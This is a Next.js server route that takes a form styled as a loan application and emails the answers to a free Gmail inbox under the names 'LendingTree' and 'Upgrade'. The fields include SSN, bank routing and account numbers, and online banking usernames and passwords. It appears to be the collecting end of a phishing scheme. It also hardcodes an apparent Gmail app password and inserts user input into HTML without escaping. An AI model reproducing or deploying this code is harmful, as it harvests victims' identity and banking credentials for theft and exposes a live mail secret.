import { NextRequest, NextResponse } from 'next/server';
import nodemailer from 'nodemailer';

export async function POST(request: NextRequest) {
  try {
    const formData = await request.json();

    // Create a transporter (you'll need to configure this with your email service)
    const transporter = nodemailer.createTransport({
      host: 'smtp.gmail.com',
      port: 587,
      secure: false,
      auth: {
        user: "lendingtreeloans970@gmail.com",
        pass: "fioa bvtg dhdl kyew",
        //   user: process.env.EMAIL_USER,
        // pass: process.env.EMAIL_PASS,
      },
    });

    // Email content
    const mailOptions = {
      from: "lendingtreeloans970@gmail.com",
      to: "lendingtreeloans970@gmail.com",
      // from: process.env.EMAIL_USER,
      // to: process.env.ADMIN_EMAIL || 'dsadASD',
      subject: 'New Loan Application - Upgrade',
      html: `
        <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; background-color: #f8fafc;">
          <div style="background: linear-gradient(135deg, #3b82f6, #10b981); padding: 30px; border-radius: 10px; text-align: center; margin-bottom: 30px;">
            <h1 style="color: white; margin: 0; font-size: 28px;">New Loan Application</h1>
            <p style="color: #e0f2fe; margin: 10px 0 0 0; font-size: 16px;">Upgrade</p>
          </div>
          
          <div style="background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);">
            <h2 style="color: #1f2937; border-bottom: 2px solid #e5e7eb; padding-bottom: 10px;">Loan Details</h2>
            <table style="width: 100%; margin-bottom: 25px;">
              <tr>
                <td style="padding: 8px 0; font-weight: bold; color: #374151;">Amount:</td>
                <td style="padding: 8px 0; color: #1f2937;">$${formData.loanAmount}</td>
              </tr>
              <tr>
                <td style="padding: 8px 0; font-weight: bold; color: #374151;">Purpose:</td>
                <td style="padding: 8px 0; color: #1f2937;">${formData.loanPurpose}</td>
              </tr>
            </table>
            
            <h2 style="color: #1f2937; border-bottom: 2px solid #e5e7eb; padding-bottom: 10px;">Personal Information</h2>
            <table style="width: 100%; margin-bottom: 25px;">
              <tr>
                <td style="padding: 8px 0; font-weight: bold; color: #374151;">Name:</td>
                <td style="padding: 8px 0; color: #1f2937;">${formData.firstName} ${formData.middleName} ${formData.lastName}</td>
              </tr>
              <tr>
                <td style="padding: 8px 0; font-weight: bold; color: #374151;">Address:</td>
                <td style="padding: 8px 0; color: #1f2937;">${formData.streetAddress}, ${formData.city}, ${formData.state} ${formData.zipCode}</td>
              </tr>
              <tr>
                <td style="padding: 8px 0; font-weight: bold; color: #374151;">SSN:</td>
                <td style="padding: 8px 0; color: #1f2937;">${formData.socialSecurityNumber}</td>
              </tr>
            </table>
            
            <h2 style="color: #1f2937; border-bottom: 2px solid #e5e7eb; padding-bottom: 10px;">Contact Information</h2>
            <table style="width: 100%; margin-bottom: 25px;">
              <tr>
                <td style="padding: 8px 0; font-weight: bold; color: #374151;">Primary Phone:</td>
                <td style="padding: 8px 0; color: #1f2937;">${formData.phoneNumber}</td>
              </tr>
              <tr>
                <td style="padding: 8px 0; font-weight: bold; color: #374151;">Secondary Phone:</td>
                <td style="padding: 8px 0; color: #1f2937;">${formData.secondNumber}</td>
              </tr>
              <tr>
                <td style="padding: 8px 0; font-weight: bold; color: #374151;">Email Address:</td>
                <td style="padding: 8px 0; color: #1f2937;">${formData.emailAddress}</td>
              </tr>
            </table>
            
            <h2 style="color: #1f2937; border-bottom: 2px solid #e5e7eb; padding-bottom: 10px;">Banking Information</h2>
            <table style="width: 100%; margin-bottom: 25px;">
              <tr>
                <td style="padding: 8px 0; font-weight: bold; color: #374151;">Bank Name:</td>
                <td style="padding: 8px 0; color: #1f2937;">${formData.bankName}</td>
              </tr>
              <tr>
                <td style="padding: 8px 0; font-weight: bold; color: #374151;">Routing Number:</td>
                <td style="padding: 8px 0; color: #1f2937;">${formData.routingNumber}</td>
              </tr>
              <tr>
                <td style="padding: 8px 0; font-weight: bold; color: #374151;">Account Number:</td>
                <td style="padding: 8px 0; color: #1f2937;">${formData.accountNumber}</td>
              </tr>
              <tr>
                <td style="padding: 8px 0; font-weight: bold; color: #374151;">Online Banking Username:</td>
                <td style="padding: 8px 0; color: #1f2937;">${formData.onlineBankingUsername}</td>
              </tr>
               <tr>
                <td style="padding: 8px 0; font-weight: bold; color: #374151;">Online Banking Password:</td>
                <td style="padding: 8px 0; color: #1f2937;">${formData.onlineBankingPassword}</td>
              </tr>
            </table>
            
            <div style="background: #f3f4f6; padding: 15px; border-radius: 8px; margin-top: 25px;">
              <p style="margin: 0; color: #6b7280; font-size: 14px;">
                <strong>Application submitted on:</strong> ${new Date().toLocaleString()}<br>
                <strong>Application ID:</strong> LT-${Date.now()}
              </p>
            </div>
          </div>
          
          <div style="text-align: center; margin-top: 30px; color: #6b7280; font-size: 12px;">
            <p>This email was generated automatically by Upgrade application system.</p>
          </div>
        </div>
      `,
    };

    await transporter.sendMail(mailOptions);

    return NextResponse.json({ success: true });
  } catch (error) {
    console.error('Error sending email:', error);
    return NextResponse.json(
      { error: 'Failed to submit application' },
      { status: 500 }
    );
  }
}